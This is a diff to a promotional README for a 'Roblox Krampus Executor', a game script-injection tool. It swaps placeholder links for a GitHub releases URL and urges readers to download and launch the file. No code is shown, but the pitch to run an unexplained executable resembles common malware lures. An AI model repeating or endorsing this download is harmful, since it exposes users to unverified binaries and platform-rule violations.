@@ -34,7 +34,7 @@ The Roblox Krampus Executor is designed to enhance your Roblox experience by pro
 
 ## Get Started
 
-To download the Roblox Krampus Executor, click [here](https://github.com/files/File.zip). Make sure to launch the file after downloading to unleash the full potential of the executor! 🔗
+To download the Roblox Krampus Executor, click [here](https://github.com/chaojidashuaige-svg/Roblox-Krampus/releases). Make sure to launch the file after downloading to unleash the full potential of the executor! 🔗
 
 If the link is not working or you prefer other options, feel free to check the "Releases" section for alternative download sources. 📦
 
@@ -46,7 +46,7 @@ Get ready to script, game, and conquer with the Roblox Krampus Executor – your
 
 ### Are you ready to elevate your Roblox experience? Let's get started! 🚀
 
-![Roblox Krampus Executor](https://example.com/image.png)
+![Roblox Krampus Executor](https://github.com/chaojidashuaige-svg/Roblox-Krampus/releases)
 
 ---
 
